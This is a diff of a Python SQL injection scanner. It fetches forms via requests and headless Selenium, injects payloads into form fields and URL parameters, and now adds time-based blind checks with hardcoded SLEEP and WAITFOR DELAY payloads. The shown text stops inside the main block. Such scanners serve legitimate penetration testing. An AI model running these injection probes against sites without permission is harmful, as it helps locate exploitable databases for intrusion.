@@ -1,46 +1,67 @@
-import requests  # Library to make HTTP requests (GET, POST, etc.)
-from bs4 import BeautifulSoup  # Parses HTML content to extract information like forms
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse  # For URL manipulation
-import json  # To save results in JSON format for easy reading & sharing
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
+import json
+import time
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium import webdriver
 
-# Create a requests Session for persistent connection & to set headers like User-Agent
 s = requests.Session()
 s.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
 
-
-# Load SQL injection payloads (test strings) from a file
+# Load SQL injection payloads from file
 def load_payloads(filename="payloads.txt"):
     with open(filename, "r") as f:
-        # Read all lines, strip whitespace, and ignore empty lines
         return [line.strip() for line in f if line.strip()]
 
-
-# Extract all forms from a webpage at 'url'
+# Extract forms using BeautifulSoup or fallback to Selenium
 def get_forms(url):
-    # Send GET request and parse HTML
-    soup = BeautifulSoup(s.get(url).content, "html.parser")
-    # Return list of all <form> elements
-    return soup.find_all("form")
+    all_forms = []
 
+    # Try extracting forms using requests
+    try:
+        print("[*] Trying to fetch forms via requests...")
+        soup = BeautifulSoup(s.get(url).content, "html.parser")
+        forms = soup.find_all("form")
+        if forms:
+            all_forms.extend(forms)
+    except Exception as e:
+        print(f"[!] Requests error: {e}")
 
-# Extract form details: action URL, method, and all input fields with their info
+    # Always attempt Selenium for JS-rendered forms
+    print("[*] Also fetching forms via Selenium...")
+    options = FirefoxOptions()
+    options.add_argument("--headless")
+    options.set_preference("general.useragent.override", s.headers["User-Agent"])
+    driver = webdriver.Firefox(options=options)
+    driver.get(url)
+    soup = BeautifulSoup(driver.page_source, "html.parser")
+    driver.quit()
+
+    selenium_forms = soup.find_all("form")
+    for form in selenium_forms:
+        if form not in all_forms:  # Avoid duplicate forms
+            all_forms.append(form)
+
+    return all_forms
+
+# Extract form details
 def form_details(form):
-    action = form.attrs.get("action")  # Where form submits data
-    method = form.attrs.get("method", "get").lower()  # HTTP method (default GET)
+    action = form.attrs.get("action")
+    method = form.attrs.get("method", "get").lower()
     inputs = []
-    # Extract inputs, textareas, and selects
     for tag in form.find_all(["input", "textarea", "select"]):
         input_type = tag.attrs.get("type", "text")
         input_name = tag.attrs.get("name")
         input_value = tag.attrs.get("value", "")
         if tag.name == "textarea":
-            input_value = tag.text  # Text inside textarea
+            input_value = tag.text
         if input_name:
             inputs.append({"type": input_type, "name": input_name, "value": input_value})
     return {"action": action, "method": method, "inputs": inputs}
 
-
-# Check if the HTTP response contains signs of SQL error messages
+# Error-based vulnerability check
 def is_vulnerable(response):
     errors = {
         "you have an error in your sql syntax",
@@ -49,71 +70,82 @@ def is_vulnerable(response):
         "quoted string not properly terminated",
         "syntax error"
     }
-    # Return True if any known error message is found in response text (case-insensitive)
     return any(error in response.text.lower() for error in errors)
 
+# Time-based blind SQLi check
+def is_time_delayed(url, method, data):
+    start = time.time()
+    if method == "post":
+        s.post(url, data=data)
+    else:
+        s.get(url, params=data)
+    end = time.time()
+    return end - start > 4  # 5 sec threshold
 
-# Scan a single form by injecting payloads in inputs
+# Scan form for error-based SQLi
 def scan_form(url, form, payloads):
-    details = form_details(form)  # Get form info
-    # Resolve the action URL relative to the base url if needed
+    details = form_details(form)
     target = urljoin(url, details["action"]) if details["action"] else url
     results = []
 
     for payload in payloads:
         data = {}
-        # Prepare form data with payload injected in each input field
         for input_tag in details["inputs"]:
-            # If hidden field or already has a value, append payload
             if input_tag["type"] == "hidden" or input_tag["value"]:
                 data[input_tag["name"]] = input_tag["value"] + payload
-            # Otherwise send 'test' + payload as input value (skip submit buttons)
             elif input_tag["type"] != "submit":
                 data[input_tag["name"]] = f"test{payload}"
 
         print(f"[*] Testing form at {target} with payload: {payload}")
-
-        # Send POST or GET request accordingly
         if details["method"] == "post":
             res = s.post(target, data=data)
         else:
             res = s.get(target, params=data)
 
-        # Check if response shows SQL error (possible vulnerability)
         if is_vulnerable(res):
             print(f"[!!!] SQL Injection vulnerability detected in form at {target} with payload: {payload}")
-            results.append({
-                "url": target,
-                "payload": payload,
-                "method": details["method"],
-                "data": data
-            })
-            break  # Stop testing more payloads on this form once vulnerable
+            results.append({"type": "error", "url": target, "payload": payload, "method": details["method"], "data": data})
+            break
+    return results
 
+# Scan form for time-based blind SQLi
+def scan_form_blind(url, form, blind_payloads):
+    details = form_details(form)
+    target = urljoin(url, details["action"]) if details["action"] else url
+    results = []
+
+    for payload in blind_payloads:
+        data = {}
+        for input_tag in details["inputs"]:
+            if input_tag["type"] == "hidden" or input_tag["value"]:
+                data[input_tag["name"]] = input_tag["value"] + payload
+            elif input_tag["type"] != "submit":
+                data[input_tag["name"]] = f"test{payload}"
+
+        print(f"[*] Testing BLIND form at {target} with payload: {payload}")
+        if is_time_delayed(target, details["method"], data):
+            print(f"[!!!] Blind SQLi detected at {target} with payload: {payload}")
+            results.append({"type": "blind", "url": target, "payload": payload, "method": details["method"], "data": data})
+            break
     return results
 
 
-# Test URL parameters by injecting payloads one by one
+# Scan URL parameters for error-based SQLi
 def scan_url_parameters(url, payloads):
     print(f"[+] Testing URL parameters for {url}")
     parsed = urlparse(url)
-    query = parse_qs(parsed.query)  # Extract query parameters as a dict
-
+    query = parse_qs(parsed.query)
     vulnerable_points = []
 
     if not query:
         print("[*] No URL parameters to test.")
         return vulnerable_points
 
-    # For each parameter, inject payloads and test
     for param in query:
         original_values = query.copy()
         for payload in payloads:
             injected_values = original_values.copy()
-            # Inject payload by appending to the original parameter value
             injected_values[param] = [original_values[param][0] + payload]
-
-            # Rebuild query string and full URL
             new_query = urlencode(injected_values, doseq=True)
             new_url = urlunparse(parsed._replace(query=new_query))
 
@@ -121,40 +153,60 @@ def scan_url_parameters(url, payloads):
             res = s.get(new_url)
             if is_vulnerable(res):
                 print(f"[!!!] Potential SQL Injection found with param '{param}' and payload '{payload}'")
-                vulnerable_points.append({
-                    "url": new_url,
-                    "param": param,
-                    "payload": payload
-                })
-                break  # Stop testing more payloads on this param once vulnerable
-
+                vulnerable_points.append({"type": "error", "url": new_url, "param": param, "payload": payload})
+                break
     return vulnerable_points
 
 
-# The main scanning function that combines form and URL param scanning
+# Scan URL parameters for time-based blind SQLi
+def scan_url_parameters_blind(url, blind_payloads):
+    print(f"[+] Testing URL parameters for blind SQLi: {url}")
+    parsed = urlparse(url)
+    query = parse_qs(parsed.query)
+    results = []
+
+    if not query:
+        return results
+
+    for param in query:
+        for payload in blind_payloads:
+            test_query = query.copy()
+            test_query[param] = [query[param][0] + payload]
+            new_query = urlencode(test_query, doseq=True)
+            new_url = urlunparse(parsed._replace(query=new_query))
+
+            print(f"[*] Testing BLIND param {param} with payload: {payload}")
+            start = time.time()
+            s.get(new_url)
+            if time.time() - start > 4:
+                print(f"[!!!] Blind SQL Injection vulnerability detected on {new_url}")
+                results.append({"type": "blind", "url": new_url, "param": param, "payload": payload})
+                break
+    return results
+
+# Main scanner
+
+
 def scan_url(url):
     forms = get_forms(url)
     print(f"[+] Detected {len(forms)} form(s) on {url}")
     payloads = load_payloads()
+    blind_payloads = ["' OR SLEEP(5)--", '" OR SLEEP(5)--', "'; WAITFOR DELAY '0:0:5'--"]
+
     final_results = []
 
-    # Scan all forms found
     for form in forms:
-        result = scan_form(url, form, payloads)
-        final_results.extend(result)
+        final_results.extend(scan_form(url, form, payloads))
+        final_results.extend(scan_form_blind(url, form, blind_payloads))
 
-    # Scan URL parameters
-    url_results = scan_url_parameters(url, payloads)
-    final_results.extend(url_results)
+    final_results.extend(scan_url_parameters(url, payloads))
+    final_results.extend(scan_url_parameters_blind(url, blind_payloads))
 
-    # Save all potential vulnerabilities found into results.json
     with open("results.json", "w") as f:
         json.dump(final_results, f, indent=4)
 
-    print(f"\n[✓] Scan complete. {len(final_results)} potential vulnerabilities saved to results.json")
+    print(f"\n[✓] Scan complete. {len(final_results)} issues saved to results.json")
 
-
-# Script entry point: ask for URL and start scanning
 if __name__ == "__main__":
     target_url = input("Please enter the URL to scan: ").strip()
     if not target_url:
